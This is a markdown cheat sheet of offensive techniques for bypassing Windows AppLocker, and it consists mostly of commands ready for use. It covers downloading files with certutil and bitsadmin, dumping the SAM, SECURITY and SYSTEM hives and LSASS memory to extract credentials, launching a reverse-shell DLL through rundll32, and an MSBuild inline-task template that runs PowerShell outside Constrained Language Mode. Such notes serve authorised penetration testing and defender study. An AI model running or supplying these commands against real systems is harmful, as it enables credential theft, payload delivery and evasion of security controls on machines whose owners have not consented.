# Applocker bypasses

## General
* Binaries on C:\Windows are exempted by default
	* C:\Windows\Temp
	* C:\Windows\Tasks
	* Execute powershell scripts but not load them (```.\PowerView.ps1```)
* Use LOLBAS
* Use winrs and spawn cmd.exe instead (```winrs.exe -r:<COMPUTER> cmd.exe```)
* Lateral Movement via PsExec or Scheduled Task bypass it

## LOLBAS
* https://lolbas-project.github.io/#

### File downloading
```
certutil -urlcache -split -f <URL>
bitsadmin /transfer WindowsUpdates /priority normal <URL> C:\\PATH\\TO\\FILE
```

### SAM dumping
```
reg save HKLM\SECURITY C:\Windows\Temp\security.bak
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
reg save HKLM\SAM C:\Windows\Temp\sam.bak
secretsdump.py -sam sam.bak -security security.bak -system system.bak local
```

### LSASS Dumping
```
Get-Process | Select lsass
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS PID> dump.bin full
pypykatz.py lsa minidump <DUMP FILE>
```

### Execute your own DLLs (like revshells)
```
rundll32.exe shell.dll,StartW
```

### MSBuild.exe custom runspace no CLM
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("<PS COMMAND>");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```